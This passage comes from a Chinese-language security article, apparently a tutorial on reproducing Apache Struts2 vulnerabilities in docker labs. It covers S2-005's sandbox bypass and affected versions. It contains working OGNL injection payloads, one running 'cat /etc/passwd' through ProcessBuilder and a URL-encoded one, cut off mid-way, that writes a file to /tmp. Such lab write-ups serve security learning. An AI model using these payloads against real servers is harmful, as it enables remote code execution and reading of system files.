51);">[</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">50000</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">],#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">d</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">read</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">e</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">),#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">f</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">context</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">get</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"com.opensymphony.xwork2.dispatcher.HttpServletResponse"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">),#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">f</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">getWriter</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">().</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">println</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">new</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> java</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">lang</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">String</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">e</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)),#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">f</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">getWriter</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">().</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">flush</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(),#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">f</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">getWriter</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">().</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">close</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">()}</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.4954337899543379" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/5_7dnVvnkUw6Ir7sh8BX8XO2992wRsyQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wuZiaSOAib3Q3eTfzeiaUkdXvkJk7dnVvnkUw6Ir7sh8BX8XO2992wRsyQ/640?wx_fmt=png'" data-type="png" data-w="438" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">使用payload执行<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">cat /etc/password</code>命令</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;;text-align: start;white-space: normal;"><pre data-lang="java" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%{#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">a</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">new</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> java</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">lang</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">ProcessBuilder</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">new</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> java</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">lang</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">String</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">[]{</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"cat"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">,</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"/etc/passwd"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">})).</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">redirectErrorStream</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">true</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">).</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">start</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(),#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">b</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">a</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">getInputStream</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(),#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">c</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">new</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> java</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">io</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">InputStreamReader</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">b</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">),#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">d</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">new</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> java</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">io</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">BufferedReader</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">c</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">),#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">e</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">new</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">char</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">[</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">50000</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">],#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">d</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">read</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">e</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">),#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">f</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">context</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">get</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"com.opensymphony.xwork2.dispatcher.HttpServletResponse"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">),#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">f</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">getWriter</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">().</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">println</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">new</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> java</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">lang</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">String</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">e</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)),#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">f</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">getWriter</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">().</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">flush</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(),#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">f</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">getWriter</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">().</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">close</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">()}</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.2676348547717842" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/6_icSwXosa8sYWxw18Pe5TeloZ08PJLw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wZGITmRRaRb905wcEn1icYiaib6TlicSwXosa8sYWxw18Pe5TeloZ08PJLw/640?wx_fmt=png'" data-type="png" data-w="1446" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><h1 style="margin: 2em auto 1em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: center;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.2em;font-weight: bold;display: table;padding-right: 1em;padding-left: 1em;border-bottom: 2px solid rgb(15, 76, 129);">S2-005</h1><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">s2-005漏洞的起源源于S2-003(受影响版本: 低于Struts 2.0.12)，struts2会将http的每个参数名解析为OGNL语句执行(可理解为java代码)。OGNL表达式通过#来访问struts的对象，struts框架通过过滤#字符防止安全问题，然而通过unicode编码(\u0023)或8进制(\43)即绕过了安全限制，对于S2-003漏洞，官方通过增加安全配置(禁止静态方法调用和类方法执行等)来修补，但是安全配置被绕过再次导致了漏洞，攻击者可以利用OGNL表达式将这2个选项打开，S2-003的修补方案把自己上了一个锁，但是把锁钥匙给插在了锁头上。XWork会将GET参数的键和值利用OGNL表达式解析成Java语句，如：</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;;text-align: start;white-space: normal;"><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">user</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">address</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">city</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Bishkek</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">&amp;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">user</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">[</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">'favoriteDrink'</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">]=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">kumys </span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(150, 152, 150);">//会被转化成</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">action</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">getUser</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">().</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">getAddress</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">().</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">setCity</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"Bishkek"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">  </span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">action</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">getUser</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">().</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">setFavoriteDrink</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"kumys"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)</span></span></code></pre></section><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">触发漏洞就是利用了这个点，再配合OGNL的沙盒绕过方法，组成了S2-003。官方对003的修复方法是增加了安全模式（沙盒），S2-005在OGNL表达式中将安全模式关闭，又绕过了修复方法。整体过程如下：</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">S2-003 使用\u0023绕过s2对#的防御 S2-003 后官方增加了安全模式（沙盒） S2-005 使用OGNL表达式将沙盒关闭，继续执行代码</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">影响版本: 2.0.0 - 2.1.8.1</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">进入s2-005的docker环境</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.5737392959086585" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/7_dxM61bibAC7mfz7n5vYtdp5Tkhdtzg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wiaxc5GO4sDm9pIdCooQJ9tIvdrdxM61bibAC7mfz7n5vYtdp5Tkhdtzg/640?wx_fmt=png'" data-type="png" data-w="1051" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">抓包添加payload执行往/tmp/目录下写入success文件的操作</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;;text-align: start;white-space: normal;"><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">27</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">5cu0023</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">_memberAccess</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">[%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">5c</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">27allowStaticMethodAccess</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">5c</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">27</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">]%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">27</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">vaaa</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">true</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">&amp;(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">aaaa</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)((%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">27</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">5cu0023context</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">[%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">5c</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">27xwork</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">MethodAccessor</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">denyMethodExecution</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%</span><span 